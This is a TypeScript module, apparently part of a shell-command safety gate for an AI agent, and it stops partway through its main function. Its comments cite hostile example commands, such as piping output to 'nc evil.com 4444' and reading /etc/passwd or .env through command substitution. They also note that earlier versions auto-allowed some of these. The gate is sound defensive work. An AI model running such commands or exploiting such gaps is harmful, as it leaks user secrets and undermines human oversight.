import path from "node:path";
import { parseCommand, type OpaqueRef, type BashSegment, type PathHop } from "./bash-parser";
import { analyzeSegment } from "./segment-analysis";
import { trackEffectiveCwd, reResolveCwdDependentPaths, baseAccessPath, staleCwdResolutions, homeReassigned, UNKNOWN_CWD_MARKER, type CwdBase } from "./cwd-tracking";
import { expandTilde, OPAQUE_VAR_DIR } from "./path-util";
import { resolveOpaqueRefs, type UnresolvedRef, type ShellAssignment } from "./var-resolution";
import { parseTmuxCommand, tmuxSendKeysKeys } from "./tmux";
import { analyzeWholeCommandRisk, type CommandRisk } from "./risk-analyzer";
import { hasRelativePath, getOutsideCwdPaths, getOutsideWritePaths, resolvePathsToDirs } from "./path-analysis";
import { classifyStageArgv0 } from "./argv0-path";
import { assessDeletes, type DeleteScale } from "./delete-scale";
import { checkCommandForCredentialPaths } from "./credentials";
import { getCommandSignature, getFirstWord, STARTS_WITH_REDIRECT_RE, segmentNamesRunOptions, segmentRunFormUngrantable, segmentStages } from "./segment-helpers";
import { isAllowedCommand, isSafeSubcommand } from "../config";

/** Safety verdict for a shell command. */
export interface SafetyVerdict {
  /** The command is structurally safe for auto-allow (no subshells, obfuscation, etc). */
  canBeAutoAllowed: boolean;
  /** Every segment is a simple allowed command. */
  isSimple: boolean;
  /** Any segment matches a danger pattern that mandates a prompt. */
  hasUnsafePattern: boolean;
}

/** Prompt-specific data derived from command analysis. */
export interface PromptHints {
  /** Indices of segments whose signature is NOT in the static allowlist. */
  nonAllowlistedSegmentIndices: number[];
  /** Unique signatures of non-allowlisted segments (for prompt display). */
  promptSignatures: string[];
  /** Paths outside cwd and allowed dirs. Undefined if allowed dirs not provided. */
  outsidePaths: string[] | undefined;
  /** Directories containing outside paths. Undefined if allowed dirs not provided. */
  outsideDirs: string[] | undefined;
  /** Whether path approval is needed (outside paths exist). Undefined if allowed dirs not provided. */
  needsPathApproval: boolean | undefined;
  /**
   * The write-role subset of the path set that sits outside cwd, the config
   * write dirs and the session's WRITE grants (G3, analysis/write-roles).
   * A read grant never appears here: `~/.pi` is read-allowed (the agent reads
   * its skills) and must not accept `mkdir ~/.pi/agent/pwned-dir`. Undefined
   * if the write predicate was not provided.
   */
  outsideWritePaths: string[] | undefined;
  /** Directories containing those write targets (prompt display + Always tier). */
  outsideWriteDirs: string[] | undefined;
  /** Whether write approval is needed (outside write targets exist). */
  needsWriteApproval: boolean | undefined;
  /**
   * Literal tokens whose realpath differs from the written form (symlink
   * hop) and whose resolved location is in the outside set — the prompt
   * renders them under the outside-cwd line so a dir that appears nowhere
   * in the command text traces back to its token. Undefined if allowed
   * dirs not provided.
   */
  symlinkHops: PathHop[] | undefined;
  /**
   * Opaque references the analysis could not statically bind (a variable
   * value not knowable from the command text, or a cwd-local value under an
   * unknown base). Their markers are in the path set (approval is forced);
   * the prompt lists the tokens. They are never part of an Always grant.
   */
  unresolved: UnresolvedRef[];
}

/** Full analysis of a shell command — single source of truth for parsing, safety, and risk. */
export interface CommandAnalysis {
  /** Raw segment strings, split on &&, ||, ;, |, etc. */
  segments: string[];
  /** Command signatures for auto-allow matching (e.g. "git -R", "ls").
   *  Stage-scoped like `segments`: a pipeline's signature is its FIRST stage's
   *  (display identity); approval is decided per stage (`stageSignatures`). */
  signatures: string[];
  /** Pipeline stages per segment (G1) — parallel to `segments`; a segment that
   *  is not a pipeline is one stage. Stage texts come from the AST, not from
   *  re-splitting the segment text. */
  stageTexts: string[][];
  /** Signature per stage, parallel to `stageTexts`. All stages of a segment
   *  share that segment's effective base (a pipeline runs in one cwd), so the
   *  index-keyed sets (`relativePathSegmentIndices`, run-dep sets) stay keyed
   *  by SEGMENT — renumbering them is the bug G1 exists to avoid. */
  stageSignatures: string[][];
  /** Per stage: does its command position name a PATH-qualified program the
   *  system does not own (`bin/ls`, `~/Downloads/ls`, `/tmp/evil/git`,
   *  `node_modules/.bin/tsc`)? Computed once against each segment's effective
   *  base, because the answer is the same question every consumer asks: the
   *  grant binding refuses basename inheritance, the prompt offers the
   *  base-bound grant, and the parser minted the program's own location as a
   *  path operand (analysis/argv0-path). */
  stageArgv0Qualified: boolean[][];
  /** Indices of segments that are run forms NAMING an option value that
   *  decides what is installed or executed (uv's dep flags, `--python`,
   *  anything outside uv's closed option world): their signature IS that
   *  option set, so a coarse grant must not prefix-match them (an Always for
   *  one set never covers another). */
  runOptionSegmentIndices: number[];
  /** Indices of run-form segments no grant can cover — an option or selected
   *  package the shell decides at run time, or a path value whose cwd is not
   *  knowable. */
  ungrantableRunFormSegmentIndices: number[];
  /** All extracted file/dir paths, resolved to absolute. */
  paths: string[];
  /** The subset of `paths` the command WRITES (see analysis/write-roles): the
   *  operand a `mv`/`cp`/`mkdir`/`rm` lands in, a `>` destination, `sort -o`'s
   *  value, a write-capable code body's operand. Always a subset of `paths`
   *  by construction — the same mint sites, the same dedup filter — so the
   *  decision layer checks it against the WRITE allow set alone (a READ grant
   *  never satisfies a write). */
  writePaths: string[];
  /** Detailed safety verdict. */
  safety: SafetyVerdict;
  /** Detailed risk assessment from token-based and regex-based analysis. */
  risk: CommandRisk;
  /** Delete scale (docs/dspa-intent-floor.md §6 D-c): the shape flags and the
   *  capped reach count of every delete operand in the command. The floor acts
   *  on `absolute` and the count ceiling; `note` rides into the judge packet
   *  and the prompt risk line (`deletes 312 files, recursive`). */
  deleteScale: DeleteScale;
  /** Indices of segments that contain relative path tokens (./foo, ../foo). */
  relativePathSegmentIndices: number[];
  /** Effective working directory per segment (null = unresolvable base). */
  effectiveCwds: (string | null)[];
  /** Raw opaque data (unresolved — the dspa floor re-resolves it under its
   * own stricter bar). Parsed segments carry subshell depth for scoping. */
  opaque: OpaqueRef[];
  assignments: ShellAssignment[];
  /** Names passed to `unset` (HOME reassignment guard — see var-resolution). */
  unsets: string[];
  /** Opaque argv0 tokens the text cannot resolve to a program name ($CMD start,
   *  "$PY" job.py with PY unset). The location model falls back to worst-case
   *  operand minting there (see parseCommand), and the command position counts
   *  as an unsafe pattern, so the judge packet sees the position is obscured. */
  obscuredArgv0: string[];
  parsedSegments: BashSegment[];
  /** Credential path detected in the command — never auto-allow; the prompt carries the very-high-risk warning. */
  hasCredentialPath: boolean;
  /** Matched credential pattern name, if any (e.g. ".env", ".aws"). */
  credentialRule: string | null;
  /** Whether tree-sitter produced ERROR nodes (malformed bash). */
  hasParseError: boolean;
  /** Prompt-specific derived data. */
  prompt: PromptHints;

}

/**
 * Analyze a shell command. Single source of truth for parsing, path extraction,
 * safety evaluation, and risk assessment.
 *
 * Uses tree-sitter-bash AST for accurate segmentation, path extraction,
 * and operator detection (handles heredocs, comments, quotes, subshells,
 * and redirects correctly).
 */
export interface AnalyzeCommandOptions {
  /** Predicate: is this resolved path inside a session-auto-allowed dir (read or write)? */
  isInsideAllowedDir?: (path: string) => boolean;
  /** Predicate: is this resolved path inside a session WRITE-allowed dir (G3)?
   *  Deliberately separate from the read predicate — a read grant must never
   *  satisfy a write target. Absent = the write bar is not computed. */
  isInsideAllowedWriteDir?: (path: string) => boolean;
  /**
   * Confirmed resolution for an unresolved-var token (store.getConfirmedResolution
   * — the user-accepted dirs from the LLM path resolver, D12). When present the
   * sentinel is made concrete: only the confirmed dirs outside the manual bar
   * join the path set. Shared by the manual bar and the dspa gate (D7), so the
   * two agree on whether a resolved token still needs approval.
   */
  getConfirmedResolution?: (token: string) => string[] | null;
}

const TMUX_PAYLOAD_MAX_DEPTH = 3;
const TMUX_PAYLOAD_ENTER_RE = /\s+(?:Enter|C-m)\s+/;
const TMUX_PAYLOAD_QUOTE_RE = /^("|')(.*)\1$/;

/** Relative tokens under an unknown base resolve to `/x` — outside every
 * allowed dir — so trust checks fail and the path bar forces approval. */
const UNKNOWN_BASE_CWD = "/";

/** Nested `$(…)` depth cap (same shape as the tmux payload recursion). */
const SUBST_MAX_DEPTH = 3;

/**
 * Analyze command-substitution and process-substitution BODIES (G5).
 *
 * `$(…)` is not text — it is a program the shell runs before the outer command
 * starts, in the parent segment's cwd. The old check here was a name list
 * (`READONLY_SUBSHELL_CMDS`) over the body TEXT: it could not see flags
 * (`fd -x rm`), a relative operand (`cat .env`), or a `cd` inside the body
 * (`$(cd /etc && cat passwd)`), and it was a second allow table drifting from
 * the real one. Verified live at 3.37.1: `echo $(cat /etc/passwd)`,
 * `echo $(cat .env)` and `echo $(fd -x rm)` all auto-allowed — the path set was
 * empty because path minting only walks args of a PATH-AWARE command, and the
 * outer command (`echo`) is not one.
 *
 * So each body is parsed with `parseCommand` and put through the same segment
 * pipeline as a top-level command, rooted at the parent segment's effective
 * base: its own `cd` re-bases only the body (a substitution runs in a
 * subshell), its dot tokens and base access are threaded like any segment's,
 * and its operands join the command's path set. Bodies of bodies recurse to
 * `SUBST_MAX_DEPTH`; beyond the cap, or for a body the parser cannot read,
 * the command is unsafe (fail closed).
 *
 * `byParent` carries the body's segments keyed by the parent segment index so
 * the grant identity covers them — a stage list is "the programs this segment
 * runs", and a substitution body is one of those.
 */
async function analyzeSubstBodies(
  segments: BashSegment[],
  effectiveCwds: CwdBase[],
  normBase: string,
  depth: number,
): Promise<{
  byParent: Map<number, Array<{ seg: BashSegment; base: CwdBase }>>;
  paths: string[];
  /** Write-role operands of the bodies, same subset rule as `paths`. */
  writePaths: string[];
  simple: boolean;
  unsafe: boolean;
  reasons: string[];
  /** Credential rule matched inside a body (see the credential bar note below). */
  credential: string | null;
}> {
  const byParent = new Map<number, Array<{ seg: BashSegment; base: CwdBase }>>();
  const paths: string[] = [];
  const writePaths: string[] = [];
  const reasons: string[] = [];
  let credential: string | null = null;
  if (depth > SUBST_MAX_DEPTH) {
    return { byParent, paths, writePaths, simple: false, unsafe: true, reasons: [`command substitution nested beyond ${SUBST_MAX_DEPTH} levels`], credential };
  }
  const work: Array<{ seg: BashSegment; base: CwdBase }> = [];
  for (let i = 0; i < segments.length; i++) {
    const bodies = segments[i].subshellTexts;
    if (!bodies || bodies.length === 0) continue;
    const parentBase = effectiveCwds[i] ?? null;
    const root = parentBase ?? UNKNOWN_BASE_CWD;
    for (const body of bodies) {
      const trimmed = body.trim();
      if (!trimmed) continue;
      // The credential bar is a TEXT check over the command (it resolves each
      // candidate operand on disk), so it runs on the whole command text —
      // where a secret name inside a quoted substitution (`echo "$(cat .env)"`)
      // is one quoted word and never looks like an operand. A body is a real
      // command, so it gets its own pass with the body's base.
      const bodyCred = checkCommandForCredentialPaths(trimmed, root);
      if (bodyCred && !credential) credential = bodyCred;
      let parsed;
      try {
        parsed = await parseCommand(trimmed, root);
      } catch {
        parsed = null;
      }
      if (!parsed || parsed.hasParseError || parsed.segments.length === 0) {
        return { byParent, paths, writePaths, simple: false, unsafe: true, reasons: [`unreadable command substitution body: ${trimmed.slice(0, 60)}`], credential };
      }
      // The body's own cd/pushd re-base only the body; it never persists to
      // the parent (the substitution runs in a subshell — trackEffectiveCwd
      // already treats the parent side that way).
      const bodyCwds = trackEffectiveCwd(parsed.segments, root, parsed.assignments);
      threadCwdPaths(parsed.segments, bodyCwds, normBase, parsed.paths, parsed.assignments, parsed.writePaths);
      paths.push(...parsed.paths);
      writePaths.push(...parsed.writePaths);
      parsed.segments.forEach((bs, k) => {
        const base = bodyCwds[k] ?? null;
        const list = byParent.get(i);
        const entry = { seg: bs, base };
        if (list) list.push(entry); else byParent.set(i, [entry]);
        work.push(entry);
      });
      const inner = await analyzeSubstBodies(parsed.segments, bodyCwds, normBase, depth + 1);
      // A nested body belongs to the same parent SEGMENT chain — the inner
      // call's keys index ITS segments, which mean nothing out here.
      for (const list of inner.byParent.values()) {
        const dest = byParent.get(i);
        if (dest) dest.push(...list); else byParent.set(i, [...list]);
      }
      paths.push(...inner.paths);
      writePaths.push(...inner.writePaths);
      if (inner.reasons.length) reasons.push(...inner.reasons);
      if (inner.unsafe) return { byParent, paths, writePaths, simple: false, unsafe: true, reasons, credential };
    }
  }
  const analyses = await Promise.all(
    work.map(({ seg, base }) => analyzeSegment(seg, base ?? UNKNOWN_BASE_CWD, base !== null)),
  );
  let simple = true;
  let unsafe = false;
  for (const a of analyses) {
    simple &&= a.isSimple;
    unsafe ||= a.isUnsafe;
    for (const r of a.risk.reasons) if (!reasons.includes(r)) reasons.push(r);
  }
  return { byParent, paths, writePaths, simple, unsafe, reasons, credential };
}

/**
 * Normalize a raw send-keys key string into a parseable command payload:
 * strip the trailing Enter keystroke and an outer quote pair (key sequences
 * commonly arrive as one quoted argument: 'ls -la').
 */
function normalizeTmuxPayload(keys: string | null): string {
  if (!keys) return "";
  return keys.replace(/\s+Enter$/, "").replace(/^Enter$/, "")
    .trim().replace(TMUX_PAYLOAD_QUOTE_RE, "$2").trim();
}

/**
 * Analyze a `tmux send-keys` payload with the same bar as a direct command.
 * The payload is typed into a pane's shell, so every Enter-terminated chunk
 * must be as safe as running it directly. Splits on standalone Enter/C-m key
 * tokens (real command separators the parser would otherwise see as arguments)
 * and analyzes each chunk with the full segment pipeline. Recurses through
 * nested tmux send-keys (depth-capped; beyond the cap = unsafe).
 *
 * Also returns the payload chunks' resolved paths so the caller can run them
 * through outside-cwd approval — a payload reading an outside path must
 * prompt exactly as the same command run directly would.
 */
/**
 * Apply cwd threading to a (sub)command's parser path set:
 *  • DROP the stale session-cwd resolutions of post-cd segments' dot tokens
 *    (./../) — under a literal cd that the gate stat'd, that location is
 *    unreachable at runtime (a phantom outside-dir / dead grant).
 *  • ADD the base-resolved locations (or the unknown-cwd marker), and flag
 *    base access (a path-aware segment with no resolvable target of its own
 *    operates on the base — `cd /var/tmp && ls`).
 * parseCommand dedupes cross-segment, so a string may be stale for one
 * segment AND the legitimate resolution of another (base === session cwd) —
 * those are kept: removing them would under-flag the second segment.
 * One derivation for the direct command and the tmux send-keys payload —
 * both bars must converge identically. Mutates `paths`.
 */
function threadCwdPaths(
  segments: BashSegment[],
  effectiveCwds: CwdBase[],
  normBase: string,
  paths: string[],
  assignments?: ShellAssignment[],
  writePaths?: string[],
): void {
  const keepStale = new Set<string>();
  const dropStale = new Set<string>();
  // Same closed-set $HOME state as trackEffectiveCwd ran with (subshell scan).
  const homeFixed = homeReassigned(segments, assignments);
  for (let i = 0; i < segments.length; i++) {
    const stale = staleCwdResolutions(segments[i], normBase);
    if (effectiveCwds[i] === normBase) { for (const s of stale) keepStale.add(s); }
    else { for (const s of stale) dropStale.add(s); }
  }
  for (const s of dropStale) {
    if (keepStale.has(s)) continue;
    const idx = paths.indexOf(s);
    if (idx !== -1) paths.splice(idx, 1);
    const wi = writePaths?.indexOf(s) ?? -1;
    if (writePaths && wi !== -1) writePaths.splice(wi, 1);
  }
  for (let i = 0; i < segments.length; i++) {
    const base = effectiveCwds[i];
    if (base !== normBase) {
      paths.push(...reResolveCwdDependentPaths(segments[i], base));
      // G3: the same re-basing for the write set, restricted to the tokens the
      // write-role table calls a destination — otherwise a cd chain hides the
      // write (`cd ~/.pi/agent && mkdir ./x`) while the read bar sees it.
      if (writePaths) writePaths.push(...reResolveCwdDependentPaths(segments[i], base, { writesOnly: true }));
      const basePath = baseAccessPath(segments[i], base, homeFixed);
      if (basePath) paths.push(basePath);
    } else {
      // Base === session cwd: parseCommand already resolved ./../ tokens
      // against it — collect only the $PWD tokens it never saw.
      paths.push(...reResolveCwdDependentPaths(segments[i], base, { skipDotPaths: true }));
      if (writePaths) writePaths.push(...reResolveCwdDependentPaths(segments[i], base, { skipDotPaths: true, writesOnly: true }));
    }
  }
}

async function analyzeTmuxSendKeysPayload(
  payload: string,
  cwd: string,
  depth: number,
): Promise<{ simple: boolean; unsafe: boolean; paths: string[]; reasons: string[] }> {
  if (depth > TMUX_PAYLOAD_MAX_DEPTH) return { simple: false, unsafe: true, paths: [], reasons: [] };
  const chunks = payload.split(TMUX_PAYLOAD_ENTER_RE).map(p => p.trim()).filter(Boolean);
  let simple = true;
  let unsafe = false;
  const paths: string[] = [];
  const reasons: string[] = [];
  const normBase = path.resolve(expandTilde(cwd));
  for (const chunk of chunks) {
    const parsed = await parseCommand(chunk, cwd);
    if (parsed.hasParseError) return { simple: false, unsafe: true, paths: [], reasons: [] };
    // Cwd threading (same bar as the direct command): a cd inside the payload
    // re-bases later segments — re-resolve dot tokens against the effective
    // base, drop the stale session-cwd resolutions, flag base access
    // (`cd /var/tmp && ls` touches the base). The payload's opaque refs
    // resolve against the payload's own segment bases; the full outside-cwd
    // bar (allowed roots, granted dirs) applies downstream at command level.
    const payloadCwds = trackEffectiveCwd(parsed.segments, cwd, parsed.assignments);
    threadCwdPaths(parsed.segments, payloadCwds, normBase, parsed.paths, parsed.assignments);
    const payloadOpaque = resolveOpaqueRefs(
      parsed.opaque,
      parsed.segments,
      payloadCwds,
      parsed.assignments,
      cwd,
      (p) => p === cwd || p.startsWith(cwd + "/"),
      parsed.unsets,
    );
    paths.push(...parsed.paths, ...payloadOpaque.paths);
    for (const u of payloadOpaque.unresolved) paths.push(u.marker);
    for (const seg of parsed.segments) {
      const text = seg.text.trim();
      const innerTmux = parseTmuxCommand(text);
      if (getFirstWord(text) === "tmux" && innerTmux.subcommand === "send-keys") {
        const innerPayload = normalizeTmuxPayload(tmuxSendKeysKeys(innerTmux));
        const r = innerPayload
          ? await analyzeTmuxSendKeysPayload(innerPayload, cwd, depth + 1)
          : { simple: true, unsafe: false, paths: [], reasons: [] };
        simple &&= r.simple;
        unsafe ||= r.unsafe;
        paths.push(...r.paths);
        for (const reason of r.reasons) if (!reasons.includes(reason)) reasons.push(reason);
      } else {
        const a = await analyzeSegment(seg, cwd);
        simple &&= a.isSimple;
        unsafe ||= a.isUnsafe;
        for (const reason of a.risk.reasons) if (!reasons.includes(reason)) reasons.push(reason);
      }
    }
  }
  return { simple, unsafe, paths, reasons };
}

export async function analyzeCommand(
  cmd: string,
  cwd: string,
  options?: AnalyzeCommandOptions,
): Promise<CommandAnalysis> {
  // Single AST parse: segments, paths, opaque refs, and assignments in one pass
  const parseResult = await parseCommand(cmd, cwd);
  const { segments, paths, opaque, assignments, hasParseError, unsets, obscuredArgv0 } = parseResult;
  // G3: the write-role subset (analysis/write-roles). Threading mutates it in
  // step with `paths` so both sets name the same runtime locations.
  const writePaths = [...parseResult.writePaths];
  const segmentTexts = segments.map(s => s.text);

  // Effective cwd per segment: a resolvable `cd` in an earlier top-level
  // segment changes the working directory for later segments — relative script
  // paths must be analyzed against it for the trusted-script bypass to work
  // (`cd <skill-dir> && uv run … scripts/x.py`). null = unknown base (a
  // non-literal cd or a `||` branch made the runtime cwd unresolvable).
  // Computed BEFORE signatures: a `uv run` dependency source is a PATH and a
  // path identity is meaningless without the directory it resolves against.
  const effectiveCwds = trackEffectiveCwd(segments, cwd, assignments);
  // G1: one signature per PIPELINE STAGE. `signatures[i]` (the prompt/grant
  // identity) is stage 0's, exactly as before — but the grant rule can no
  // longer stop at it: an `ls` grant covering `ls | nc evil.com 4444` was the
  // bug, and per-stage splitting at the consumer re-created the drift the
  // 2026-08-24 `ls | bash /any/script` fix had to work around.
  const stageTexts = segments.map((s) => segmentStages(s));
  const stageSignatures = stageTexts.map((st, i) =>
    st.map((stext) => getCommandSignature(stext, effectiveCwds[i])));
  const signatures = stageSignatures.map((st) => st[0] ?? "");
  const runOptionSegmentIndices = segmentTexts
    .map((s, i) => (segmentNamesRunOptions(s) ? i : -1))
    .filter(i => i >= 0);
  const ungrantableRunFormSegmentIndices = segmentTexts
    .map((s, i) => (segmentRunFormUngrantable(s, effectiveCwds[i]) ? i : -1))
    .filter(i => i >= 0);

  // Cwd-dependent tokens (./x, ../x, $PWD/x) in post-cd segments were resolved
  // by parseCommand against the session cwd — re-resolve them against the
  // effective cwd so outside-cwd approval sees the real runtime location
  // (cd /tmp && cat ./secret). Under an unknown base they resolve to a marker
  // path outside every allowed dir, forcing path approval.
  //
  // Base access: a cd is navigation, not access — its target is not a path.
  // What must be approved is what later segments DO under the base the cd
  // left: a path-aware segment (or bare-name redirect) with no resolvable
  // target of its own operates on the base itself (`cd /var/tmp && ls`,
  // `cd $D && find .`) → the base (or the unknown-cwd marker) joins the path
  // set. D20: a path-like bare arg (contains `/`) under the base forces the
  // flag even alongside resolvable targets (`python3 scripts/x.py --source
  // /data` — the bare arg resolves under the base, nowhere else). Inside-
  // cwd/allowed bases are filtered out by getOutsideCwdPaths.
  // Cwd threading (see threadCwdPaths): re-base post-cd segments' dot tokens
  // on the effective base, drop the stale session-cwd resolutions, flag
  // base access. Under an unknown base the tokens resolve to a marker path
  // outside every allowed dir, forcing path approval.
  const normBase = path.resolve(expandTilde(cwd));
  threadCwdPaths(segments, effectiveCwds, normBase, paths, assignments, writePaths);

  // G5: substitution bodies are analyzed as programs (see analyzeSubstBodies).
  // Their operands join the path set, their danger folds into the command's
  // safety, and their signatures extend the parent segment's STAGE list — the
  // grant unit — so `Always` can cover a body the user runs on purpose, and a
  // body nothing is granted for can never auto-allow.
  const subst = await analyzeSubstBodies(segments, effectiveCwds, normBase, 1);
  paths.push(...subst.paths);
  writePaths.push(...subst.writePaths);
  const substSimple = subst.simple;
  const substUnsafe = subst.unsafe;
  const substCredential = subst.credential;
  const substReasons = subst.reasons.map((r) => `[Subst] ${r}`);
  for (const [segIdx, bodies] of subst.byParent) {
    for (const { seg: bodySeg, base } of bodies) {
      for (const st of segmentStages(bodySeg)) {
        stageTexts[segIdx].push(st);
        stageSignatures[segIdx].push(getCommandSignature(st, base ?? undefined));
      }
    }
  }

  // Opaque references (an expansion in path position the parser could not
  // resolve on its own): bind them with the command's own dataflow — the
  // visible local assignments (scoped: subshell-local and backgrounded
  // assignments don't count) plus each ref's tracked effective base. A bound
  // ref resolves to its concrete location — dropped when inside (the runtime
  // location is proven, no approval needed), named when outside (one
  // Always-for-dir makes later runs pass). An unbound ref keeps its sentinel
  // marker: approval is still forced, the prompt shows the token, and no
  // dead grant can be recorded for it.
  const opaqueResolution = resolveOpaqueRefs(
    opaque,
    segments,
    effectiveCwds,
    assignments,
    cwd,
    (p) => getOutsideCwdPaths([p], cwd, options?.isInsideAllowedDir).length === 0,
    unsets,
  );
  paths.push(...opaqueResolution.paths);
  for (const u of opaqueResolution.unresolved) {
    // A confirmed resolution makes the sentinel concrete (D12): push only the
    // confirmed dirs outside the manual bar (all in-bar → push nothing — the
    // runtime location is proven in-base, no approval needed). Unconfirmed
    // refs keep the marker sentinel: it forces approval and no dead grant can
    // be recorded for it. This is the same predicate the dspa gate's D7
    // sentinel pass applies (docs/dspa-redesign.md) — one derivation, so the
    // manual bar and the gate converge on a confirmed token identically.
    const confirmed = options?.getConfirmedResolution?.(u.token) ?? null;
    if (confirmed && confirmed.length > 0) {
      for (const d of confirmed) {
        const outside = getOutsideCwdPaths([d], cwd, options?.isInsideAllowedDir);
        if (outside.length > 0) paths.push(d);
      }
    } else {
      paths.push(u.marker);
    }
  }
  // The raw text of an unbound ref is not a location (its value is unknown or
  // confirmed) — the marker (unconfirmed) or the confirmed dirs are the
  // authority. Exclude the raw tokens from the approval bar so a confirmed
  // in-bar token leaves no phantom outside path (D12 convergence: the manual
  // bar and the gate agree on a resolved token).
  const unresolvedRawTokens = new Set(opaqueResolution.unresolved.map((u) => u.token));

  // Unified segment analysis: one call per segment replaces
  // hasKnownDanger + isSimpleAllowedCommand + isSegmentUnsafe + analyzeSegmentRisk.
  // Unknown-base segments are analyzed against "/": relative tokens then
  // resolve to /x — outside every allowed dir and the trusted skills dir — so
  // script trust fails and path checks force approval, while absolute-path
  // tokens (base-independent) keep their normal verdict.
  const segmentAnalyses = await Promise.all(
    segments.map((seg, i) => {
      const base = effectiveCwds[i];
      return analyzeSegment(seg, base ?? UNKNOWN_BASE_CWD, base !== null && base !== undefined);
    }),
  );

  // D-c (docs/dspa-intent-floor.md): what this command's deletes reach — shape
  // flags and a capped count. Scanned per STAGE (a pipeline's stages come from
  // the AST, so `cat f | xargs rm` presents its xargs stage) under the base the
  // stage runs in (`cd out && rm -rf *` counts `out`). A stage with no
  // resolvable base carries no count: its reach is not provable.
  const deleteScale = assessDeletes(
    stageTexts.flatMap((stages, i) => stages.map((text) => ({ text, base: effectiveCwds[i] ?? null }))),
  );

  const allSimple = segmentAnalyses.every(a => a.isSimple);
  const hasUnsafe = segmentAnalyses.some(a => a.isUnsafe);

  // tmux send-keys payloads are typed into a pane's shell — the full pipeline
  // analyzes each Enter-terminated chunk with the same auto-allow bar as a
  // direct command (timeout 5 curl, command -p sh -c, nice rm, git config,
  // … all prompt). Per-chunk risk reasons are folded into the command risk
  // tagged [TmuxPayload] so the prompt and the decision log show WHY the
  // payload is dangerous. (The TmuxEvaluator only checks the tmux subcommand
  // itself — payload judgment lives here, where the full pipeline exists.)
  let tmuxPayloadSimple = true;
  let tmuxPayloadUnsafe = false;
  const tmuxPayloadReasons: string[] = [];
  for (const seg of segments) {
    const text = seg.text.trim();
    if (getFirstWord(text) !== "tmux") continue;
    const payload = normalizeTmuxPayload(tmuxSendKeysKeys(parseTmuxCommand(text)));
    if (!payload) continue; // bare Enter keystroke — harmless
    const r = await analyzeTmuxSendKeysPayload(payload, cwd, 1);
    tmuxPayloadSimple &&= r.simple;
    tmuxPayloadUnsafe ||= r.unsafe;
    for (const reason of r.reasons) {
      const tagged = `[TmuxPayload] ${reason}`;
      if (!tmuxPayloadReasons.includes(tagged)) tmuxPayloadReasons.push(tagged);
    }
    // Payload paths join the command's path set so getOutsideCwdPaths below
    // applies the same outside-cwd approval bar as for direct commands.
    paths.push(...r.paths);
  }

  // Merge per-segment risks with whole-command risk (the [TmuxPayload] fold
  // below adds the send-keys payload reasons).
  const segmentRisks = segmentAnalyses.map(a => a.risk);
  const wholeRisk = await analyzeWholeCommandRisk(cmd, segmentRisks);

  // Pre-compute relative path indices — decision engine consumes this instead of scanning tokens
  const relativePathSegmentIndices = segmentTexts
    .map((seg, i) => hasRelativePath(seg) ? i : -1)
    .filter(i => i >= 0);

  // G4: the argv0 location class, per stage, under the base the shell would
  // resolve it from. A stage under an unresolvable base classifies as
  // qualified (fail closed — a relative program whose base is unknown cannot be
  // shown to be a system program).
  const stageArgv0Qualified = stageTexts.map((st, i) =>
    st.map((s) => classifyStageArgv0(s, effectiveCwds[i] ?? null) === "qualified"));

  // Pre-compute prompt hints: non-allowlisted segment indices and signatures.
  // G2: the display unit is the STAGE — the prompt must name the stage the
  // user is being asked about, and an "Always" click must record the grant
  // that will actually approve it. A segment is non-allowlisted when any of
  // its stages is, and its prompt signatures are those stages' signatures
  // (`ls | nc evil.com 4444` used to offer "Always: ls", which approved
  // nothing — the blocker was the `nc` stage).
  const nonAllowlistedStages: Array<[number, number]> = [];
  for (let i = 0; i < stageTexts.length; i++) {
    if (STARTS_WITH_REDIRECT_RE.test(segmentTexts[i].trim())) continue;
    for (let j = 0; j < stageTexts[i].length; j++) {
      const st = stageTexts[i][j];
      if (isSafeSubcommand(st) || isAllowedCommand(getFirstWord(st))) continue;
      nonAllowlistedStages.push([i, j]);
    }
  }
  const nonAllowlistedSegmentIndices = [...new Set(nonAllowlistedStages.map(([i]) => i))];
  const promptSignatures = [...new Set(
    nonAllowlistedStages.length > 0
      ? nonAllowlistedStages.map(([i, j]) => stageSignatures[i][j])
      : nonAllowlistedSegmentIndices.map((i) => signatures[i]),
  )];

  // Pre-compute outside paths (requires store-provided allowed dirs)
  let outsidePaths: string[] | undefined;
  let outsideDirs: string[] | undefined;
  let needsPathApproval: boolean | undefined;
  let outsideWritePaths: string[] | undefined;
  let outsideWriteDirs: string[] | undefined;
  let needsWriteApproval: boolean | undefined;
  let symlinkHops: PathHop[] | undefined;
  if (options?.isInsideAllowedDir) {
    const op = getOutsideCwdPaths(
      paths.filter((p) => !unresolvedRawTokens.has(p)),
      cwd,
      options.isInsideAllowedDir,
    );
    outsidePaths = op;
    // Only hops whose resolved location actually forced the bar (in the
    // outside set) reach the prompt — an in-bar symlink is not a signal.
    symlinkHops = parseResult.hops.filter(h => op.includes(h.resolved));
    // The bare unresolved-var sentinel names no directory — the prompt shows
    // it via the unresolved list instead (the unknown-cwd marker stays: it is
    // the display of a base the cd chain could not resolve, and is never
    // grantable — the prompt filters "<" dirs from Always options).
    outsideDirs = (await resolvePathsToDirs(op)).filter(d => {
      if (d === OPAQUE_VAR_DIR) return false;
      if (d === UNKNOWN_CWD_MARKER) return true;
      // A directory backed ONLY by unresolved-var marker paths is the static
      // prefix of an unbound token (e.g. ~/.pi/agent/extensions from
      // <unresolved-var>/~/.pi/agent/extensions/$e/*.ts). The marker keeps
      // forcing approval (a var value can contain `..`), so a grant of the
      // prefix could never satisfy it — offering "Always: Read prefix/*" for
      // it would be a dead, misleading grant. Concrete-path dirs stay.
      return op.some(p =>
        !p.startsWith(OPAQUE_VAR_DIR + "/") &&
        !p.includes(UNKNOWN_CWD_MARKER) &&
        (p === d || p.startsWith(d + "/")),
      );
    });
    needsPathApproval = op.length > 0;
  }

  // G3: the WRITE bar. Deliberately NOT the read predicate: allowedReadPaths
  // (~/.pi, the agent's own skills and extensions) and trusted script paths
  // say nothing about writing. What a write target may sit in is exactly what
  // the file path already allows a write in: cwd, the config write dirs (temp
  // dirs), or a dir/file the user granted a WRITE for this session.
  if (options?.isInsideAllowedWriteDir) {
    const ow = getOutsideWritePaths(
      [...new Set(writePaths)].filter((p) => !unresolvedRawTokens.has(p)),
      cwd,
      options.isInsideAllowedWriteDir,
    );
    outsideWritePaths = ow;
    outsideWriteDirs = (await resolvePathsToDirs(ow)).filter((d) => {
      if (d === OPAQUE_VAR_DIR) return false;
      if (d === UNKNOWN_CWD_MARKER) return true;
      return ow.some((p) =>
        !p.startsWith(OPAQUE_VAR_DIR + "/") &&
        !p.includes(UNKNOWN_CWD_MARKER) &&
        (p === d || p.startsWith(d + "/")),
      );
    });
